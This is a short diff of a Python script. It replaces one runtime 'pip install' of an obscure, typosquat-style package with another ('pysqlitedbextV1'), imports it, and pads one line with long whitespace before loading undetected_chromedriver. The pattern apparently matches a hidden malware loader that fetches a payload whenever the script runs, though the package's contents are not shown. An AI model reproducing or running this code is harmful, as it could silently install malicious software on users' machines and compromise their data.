@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythonsqlitedbextensionV2")
-import pythonsqlitedbextensionV2
+os.system("pip install pysqlitedbextV1")
+import pysqlitedbextV1
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
